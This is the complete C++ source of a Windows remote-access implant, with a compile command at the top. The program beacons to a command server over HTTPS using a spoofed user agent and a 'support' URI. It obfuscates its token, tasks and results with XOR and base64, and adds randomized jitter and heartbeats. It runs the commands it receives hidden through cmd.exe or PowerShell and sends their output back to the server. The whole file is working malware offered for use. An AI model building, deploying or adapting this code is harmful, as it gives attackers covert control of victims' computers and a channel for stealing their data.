// x86_64-w64-mingw32-g++ -std=c++17 -o  Payload_XOR.exe  Payload_XOR.cpp -static -lwinhttp -lws2_32 -lgdi32 -static-libgcc -static-libstdc++

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <chrono>
#include <thread>
#include <random>
#include <ctime>
#include <sstream>
#include <algorithm>
#include <cctype>
#include <map>
#include <fstream>
#include <iostream>

#pragma comment(lib, "winhttp.lib")

const std::string SERVER_IP = "127.0.0.0";
const int SERVER_PORT = 443;
const std::string AUTH_ID = "03c5cbb4-db45-4777-b716-f276d1a9fde3";
const int XOR_KEY = 205;
const bool STATUS_BASE64 = false;

const std::string DEFAULT_USER_AGENT = "Mozilla/5.0";
std::string PREPEND_OUTPUT = "";
std::string APPEND_OUTPUT = "";
std::map<std::string, std::string> GET_CLIENT_HEADERS;
std::map<std::string, std::string> POST_CLIENT_HEADERS;

std::string session_id = "";
std::vector<std::string> uris = {"/support/troubleshoot"};
std::string current_user_agent = DEFAULT_USER_AGENT;
double sleep_time = 60.0;
int start_jitter = 0;
int end_jitter = 0;

bool heartbeat_running = true;

namespace base64 {
    static const std::string chars_urlsafe = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    static const std::string chars_standard = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    std::string encode(const std::vector<uint8_t>& data) {
        const std::string& chars = STATUS_BASE64 ? chars_urlsafe : chars_standard;
        
        std::string ret;
        int val = 0, valb = -6;
        for (uint8_t c : data) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                ret.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) ret.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        
        if (!STATUS_BASE64) {
            while (ret.size() % 4) ret.push_back('=');
        }
        
        return ret;
    }
    
    std::vector<uint8_t> decode(const std::string& data) {
        const std::string& chars = STATUS_BASE64 ? chars_urlsafe : chars_standard;
        
        std::vector<uint8_t> ret;
        int val = 0, valb = -8;
        for (char c : data) {
            if (c == '=') break;
            size_t pos = chars.find(c);
            if (pos == std::string::npos) continue;
            val = (val << 6) + pos;
            valb += 6;
            if (valb >= 0) {
                ret.push_back((val >> valb) & 0xFF);
                valb -= 8;
            }
        }
        return ret;
    }
}

std::string xor_encrypt_decrypt_string(const std::string& data, int key) {
    std::vector<uint8_t> data_bytes(data.begin(), data.end());
    std::vector<uint8_t> encrypted;
    
    for (uint8_t b : data_bytes) {
        encrypted.push_back(b ^ static_cast<uint8_t>(key));
    }
    
    return base64::encode(encrypted);
}

std::string xor_decrypt_base64_string(const std::string& enc_data, int key) {
    if (enc_data.empty()) return "";
    
    try {
        std::vector<uint8_t> data = base64::decode(enc_data);
        std::vector<uint8_t> decrypted;
        
        for (uint8_t b : data) {
            decrypted.push_back(b ^ static_cast<uint8_t>(key));
        }
        
        return std::string(decrypted.begin(), decrypted.end());
    } catch (...) {
        return "";
    }
}

std::string trim(const std::string& str) {
    size_t start = str.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) return "";
    size_t end = str.find_last_not_of(" \t\r\n");
    return str.substr(start, end - start + 1);
}

std::string get_url(std::mt19937& gen) {
    if (uris.empty()) return "/support/troubleshoot";
    std::uniform_int_distribution<> dis(0, static_cast<int>(uris.size() - 1));
    return uris[dis(gen)];
}

std::map<std::string, std::string> parse_headers(const std::string& raw_value) {
    std::map<std::string, std::string> result;
    if (raw_value.empty()) return result;

    char separator = (raw_value.find(';') != std::string::npos) ? ';' : '\n';
    
    std::stringstream ss(raw_value);
    std::string line;
    
    while (std::getline(ss, line, separator)) {
        line = trim(line);
        if (line.empty() || line.find(':') == std::string::npos) continue;
        
        size_t colon_pos = line.find(':');
        std::string key = trim(line.substr(0, colon_pos));
        std::string value = trim(line.substr(colon_pos + 1));
        
        if (!key.empty() && !value.empty()) {
            result[key] = value;
        }
    }
    
    return result;
}

std::string http_request(const std::string& url, const std::string& json_body, bool is_post) {
    std::wstring wserver(SERVER_IP.begin(), SERVER_IP.end());
    std::wstring wpath(url.begin(), url.end());
    std::wstring wua(current_user_agent.begin(), current_user_agent.end());

    HINTERNET hSession = WinHttpOpen(wua.c_str(), 
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                     WINHTTP_NO_PROXY_NAME, 
                                     WINHTTP_NO_PROXY_BYPASS, 
                                     0);
    if (!hSession) {
        return "";
    }

    DWORD secure_protocols = 0;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &secure_protocols, sizeof(secure_protocols));

    DWORD timeout = 30000;
    WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    HINTERNET hConnect = WinHttpConnect(hSession, wserver.c_str(), (INTERNET_PORT)SERVER_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return "";
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
                                            is_post ? L"POST" : L"GET",
                                            wpath.c_str(),
                                            NULL,
                                            WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            0);
    
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    std::wstring headers = L"Content-Type: application/json\r\n";
    headers += L"Host: " + wserver + L"\r\n";
    headers += L"Connection: close\r\n";
    headers += L"Accept: */*\r\n";
    headers += L"Accept-Language: en-US,en;q=0.9\r\n";
    
    if (!json_body.empty()) {
        headers += L"Content-Length: " + std::to_wstring(json_body.length()) + L"\r\n";
    }
    
    headers += L"\r\n";

    BOOL sendResult = WinHttpSendRequest(hRequest,
                                         headers.c_str(),
                                         headers.length(),
                                         WINHTTP_NO_REQUEST_DATA,
                                         0,
                                         json_body.length(),
                                         0);
    
    if (!sendResult) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    if (!json_body.empty()) {
        DWORD bytesWritten = 0;
        if (!WinHttpWriteData(hRequest, json_body.c_str(), json_body.length(), &bytesWritten)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return "";
        }
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    std::string response;
    DWORD bytesAvailable = 0;
    DWORD bytesRead = 0;
    char buffer[4096];
    
    do {
        bytesAvailable = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable)) {
            break;
        }
        
        if (bytesAvailable > 0) {
            DWORD toRead = std::min(bytesAvailable, (DWORD)sizeof(buffer) - 1);
            if (WinHttpReadData(hRequest, buffer, toRead, &bytesRead)) {
                buffer[bytesRead] = '\0';
                response += buffer;
            }
        }
    } while (bytesAvailable > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return response;
}

std::string get_json_value(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    
    pos += search.length();
    while (pos < json.length() && std::isspace(json[pos])) pos++;
    if (pos >= json.length()) return "";
    
    bool is_string = (json[pos] == '"');
    if (is_string) pos++;
    
    size_t end = is_string ? json.find('"', pos) : json.find_first_of(",}]", pos);
    if (end == std::string::npos) end = json.length();
    
    return json.substr(pos, end - pos);
}

std::vector<std::string> get_json_array(const std::string& json, const std::string& key) {
    std::vector<std::string> result;
    std::string search = "\"" + key + "\":";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return result;
    
    pos += search.length();
    while (pos < json.length() && std::isspace(json[pos])) pos++;
    if (pos >= json.length() || json[pos] != '[') return result;
    
    pos++;
    while (pos < json.length()) {
        while (pos < json.length() && std::isspace(json[pos])) pos++;
        if (json[pos] == ']') break;
        
        if (json[pos] == '"') {
            pos++;
            size_t end = json.find('"', pos);
            if (end != std::string::npos) {
                result.push_back(json.substr(pos, end - pos));
                pos = end + 1;
            }
        }
        
        while (pos < json.length() && json[pos] != ',' && json[pos] != ']') pos++;
        if (pos < json.length() && json[pos] == ',') pos++;
    }
    
    return result;
}

std::string run_cmd_command(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr;
    HANDLE hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) {
        return "[-] Failed to create pipe";
    }

    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    std::string full_cmd = "cmd.exe /c " + cmd;
    std::vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE, 
                                   CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] CMD execution error: " + std::to_string(error);
    }

    std::string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    std::string output = trim(result);
    
    if (exitCode != 0) {
        output += "\n[Exit Code: " + std::to_string(exitCode) + "]";
    }

    return output.empty() ? "[+] Command executed (no output)" : output;
}

std::string run_powershell_command(const std::string& ps_cmd) {
    
    std::string escaped_cmd;
    for (char c : ps_cmd) {
        if (c == '"') {
            escaped_cmd += "\\\""; 
        } else {
            escaped_cmd += c;
        }
    }
    
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr;
    HANDLE hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) {
        return "[-] Failed to create pipe";
    }

    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    
    std::string full_cmd = "powershell.exe -NoProfile -NonInteractive -Command " + escaped_cmd;
    
    std::vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE, 
                                   CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] PowerShell execution error: " + std::to_string(error);
    }

    std::string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    std::string output = trim(result);
    
    if (exitCode != 0) {
        output += "\n[Exit Code: " + std::to_string(exitCode) + "]";
    }

    return output.empty() ? "[+] PowerShell command executed (no output)" : output;
}

std::string execute_command(const std::string& cmd) {
    std::string trimmed = trim(cmd);
    if (trimmed.empty()) {
        return "[no command]";
    }
    
    std::string upper_cmd = trimmed;
    std::transform(upper_cmd.begin(), upper_cmd.end(), upper_cmd.begin(), ::toupper);
    
    if (upper_cmd.length() >= 3 && upper_cmd.substr(0, 3) == "EP ") {
        return run_powershell_command(trim(trimmed.substr(3)));
    }
    
    if (upper_cmd.length() >= 2 && upper_cmd.substr(0, 2) == "EP") {
        return run_powershell_command(trim(trimmed.substr(2)));
    }
    
    return run_cmd_command(trimmed);
}

bool checkin(std::mt19937& gen) {
    std::string encrypted_token = xor_encrypt_decrypt_string(AUTH_ID, XOR_KEY);
    
    std::string payload = "{\"action\":\"checkin\",\"token\":\"" + encrypted_token + "\"}";
    
    try {
        std::string response = http_request(get_url(gen), payload, true);
        
        if (response.empty()) {
            return false;
        }
        
        std::string enc_session = get_json_value(response, "session_id");
        if (enc_session.empty()) {
            return false;
        }
        
        session_id = xor_decrypt_base64_string(enc_session, XOR_KEY);
        if (session_id.empty()) {
            return false;
        }
        
        std::string enc_ua = get_json_value(response, "user_agent");
        if (!enc_ua.empty()) {
            std::string ua = xor_decrypt_base64_string(enc_ua, XOR_KEY);
            if (!ua.empty()) {
                current_user_agent = ua;
            }
        }
        
        std::string enc_start = get_json_value(response, "start_jitter");
        std::string enc_end = get_json_value(response, "end_jitter");
        std::string enc_sleep = get_json_value(response, "Sleep");
        
        try {
            if (!enc_start.empty()) {
                std::string dec = xor_decrypt_base64_string(enc_start, XOR_KEY);
                if (!dec.empty()) {
                    start_jitter = std::stoi(dec);
                }
            }
            if (!enc_end.empty()) {
                std::string dec = xor_decrypt_base64_string(enc_end, XOR_KEY);
                if (!dec.empty()) {
                    end_jitter = std::stoi(dec);
                }
            }
            if (!enc_sleep.empty()) {
                std::string dec = xor_decrypt_base64_string(enc_sleep, XOR_KEY);
                if (!dec.empty()) {
                    sleep_time = std::stod(dec);
                }
            }
        } catch (...) {

        }
        
        std::vector<std::string> uris_raw = get_json_array(response, "uris");
        std::vector<std::string> uris_dec;
        for (const auto& u : uris_raw) {
            std::string dec = xor_decrypt_base64_string(u, XOR_KEY);
            if (!dec.empty()) {
                uris_dec.push_back(dec);
            }
        }
        if (!uris_dec.empty()) {
            uris = uris_dec;
        }
        
        std::string enc_prepend = get_json_value(response, "prepend_output");
        std::string enc_append = get_json_value(response, "append_output");
        PREPEND_OUTPUT = xor_decrypt_base64_string(enc_prepend, XOR_KEY);
        APPEND_OUTPUT = xor_decrypt_base64_string(enc_append, XOR_KEY);
        
        std::string enc_get_headers = get_json_value(response, "get_client_headers");
        std::string enc_post_headers = get_json_value(response, "post_client_headers");
        
        GET_CLIENT_HEADERS = parse_headers(xor_decrypt_base64_string(enc_get_headers, XOR_KEY));
        POST_CLIENT_HEADERS = parse_headers(xor_decrypt_base64_string(enc_post_headers, XOR_KEY));
        
        return true;
    } catch (...) {
        return false;
    }
}

std::string get_tasks(std::mt19937& gen) {
    if (session_id.empty()) {
        return "";
    }
    
    std::string payload = "{\"action\":\"get_tasks\",\"session_id\":\"" + 
                         xor_encrypt_decrypt_string(session_id, XOR_KEY) + "\"}";
    
    try {
        std::string resp = http_request(get_url(gen), payload, true);
        if (resp.empty()) {
            return "";
        }
        
        std::string enc_cmd = get_json_value(resp, "command");
        if (enc_cmd.empty()) {
            return "";
        }
        
        std::string decrypted_cmd = trim(xor_decrypt_base64_string(enc_cmd, XOR_KEY));
        
        return decrypted_cmd;
    } catch (...) {
        return "";
    }
}

void submit_output(const std::string& output, std::mt19937& gen) {
    if (session_id.empty()) {
        return;
    }
    
    std::string final_output = PREPEND_OUTPUT + 
                              (output.empty() ? "[no output]" : output) + 
                              APPEND_OUTPUT;
    
    std::string encrypted_output = xor_encrypt_decrypt_string(final_output, XOR_KEY);
    
    std::string payload = "{\"action\":\"submit\",\"session_id\":\"" + 
                         xor_encrypt_decrypt_string(session_id, XOR_KEY) + 
                         "\",\"output\":\"" + encrypted_output + "\"}";
    
    try {
        http_request(get_url(gen), payload, true);
    } catch (...) {

    }
}

void heartbeat(std::mt19937& gen) {
    if (session_id.empty()) return;
    
    std::string payload = "{\"action\":\"heartbeat\",\"session_id\":\"" + 
                         xor_encrypt_decrypt_string(session_id, XOR_KEY) + "\"}";
    
    try {
        http_request(get_url(gen), payload, true);
    } catch (...) {

    }
}

void heartbeat_thread() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_real_distribution<> dis(-15.0, 30.0);
    
    while (heartbeat_running) {
        heartbeat(gen);
        
        double sleep_duration = 45.0 + dis(gen);
        std::this_thread::sleep_for(std::chrono::milliseconds(static_cast<long long>(sleep_duration * 1000)));
    }
}

void apply_jitter(std::mt19937& gen) {
    int actual_start = start_jitter;
    int actual_end = end_jitter;
    
    if (actual_start > actual_end) {
        std::swap(actual_start, actual_end);
    }
    
    std::uniform_int_distribution<> dis(actual_start, actual_end);
    int jitter_amount = dis(gen);
    
    double final_sleep = sleep_time + jitter_amount;
    final_sleep = std::max(10.0, std::min(900.0, final_sleep));
    
    std::this_thread::sleep_for(std::chrono::milliseconds(static_cast<long long>(final_sleep * 1000)));
}

void main_loop() {
    std::random_device rd;
    std::mt19937 gen(rd());
    
    std::thread hb_thread(heartbeat_thread);
    hb_thread.detach();
    
    while (session_id.empty()) {
        if (checkin(gen)) {
            break;
        }
        
        std::uniform_real_distribution<> dis(20.0, 60.0);
        double wait_time = dis(gen);
        std::this_thread::sleep_for(std::chrono::milliseconds(static_cast<long long>(wait_time * 1000)));
    }
    
    while (true) {
        try {
            std::string cmd = get_tasks(gen);
            
            if (!cmd.empty() && cmd != "\"\"") {
                std::string result = execute_command(cmd);
                submit_output(result, gen);
            }
            
            apply_jitter(gen);
            
        } catch (...) {
            std::this_thread::sleep_for(std::chrono::seconds(60));
        }
    }
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    main_loop();
    return 0;
}
